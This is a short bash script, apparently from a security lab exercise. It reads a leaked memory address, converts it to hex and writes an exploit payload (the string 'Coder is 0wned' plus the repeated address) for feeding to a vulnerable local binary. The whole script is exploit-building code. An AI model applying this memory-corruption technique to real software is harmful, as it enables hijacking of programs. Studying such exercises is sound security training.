#!/bin/bash

# echo -ne "\n\n\n" | ./modified > \dev\null 2> resource.txt

ADDRESS=`cat resource.txt`

HEX=`python newConvert.py $ADDRESS`

# HEX=`cat resource.txt | python convert.py`

echo -ne "\n\nCoder is 0wned \0Coder is 0wned \0$HEX\0\0$HEX\0\0" > rand.txt

# echo -e "\n\nhellohellohello\0hellohellohello\0$HEX$HEX"  | ./a.out
